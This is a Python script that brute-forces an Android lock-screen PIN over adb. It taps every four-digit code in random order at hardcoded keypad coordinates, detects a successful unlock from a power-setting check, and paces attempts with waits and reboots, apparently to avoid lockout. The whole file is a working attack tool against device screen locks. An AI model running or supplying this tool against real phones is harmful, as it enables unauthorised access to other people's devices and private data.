import os, random
from time import sleep

def command(com):
    return os.system('adb %s > /dev/null 2>&1' % com)

def reboot():
    return command('reboot')

def shell(com):
    return command('shell %s' % com)

def inp(com):
    return shell('input %s' % com)

def tap(x, y):
    return inp('tap %d %d' % (x, y))

def press(n):
    A = {0: (500, 1400),
        1: (100, 800),
        2: (500, 800),
        3: (900, 800),
        4: (100, 1000),
        5: (500, 1000),
        6: (900, 1000),
        7: (100, 1200),
        8: (500, 1200),
        9: (900, 1200)
       }
    return tap(*A[n])

def swipe():
    return inp('swipe 500 1000 500 0 100')

def screenon():
    return inp('keyevent 82')

def almost_ready():
    return not bool(shell('dumpsys power | grep "Screen off timeout: 30000 ms"'))

def pattern(s):
    return [press(int(i)) for i in s]

def try5(l):
    screenon()
    swipe()
    for i in l:
        print('trying: %s' % i)
        pattern(i)
        sleep(1)
        if not almost_ready():
            print('success: %s' % i)
            return i
    press(6)
    return False

def try15(l):
    screenon()
    while not almost_ready():
        sleep(3)
    sleep(3)
    screenon()
    x = None
    x = try5(l[0:5])
    if x: return x
    sleep(35)
    x = try5(l[5:10])
    if x: return x
    sleep(35)
    x = try5(l[10:15])
    if x: return x
    reboot()

def tryall(l):
    for i in range(0, len(l), 15):
        x = try15(l[i:i + 15])
        if x:
            return x
    return False

def main():
    x = ['%04d' % i for i in range(10000)]
    random.shuffle(x)
    print(x)
    return tryall(x)

if __name__ == '__main__':
    print(main())
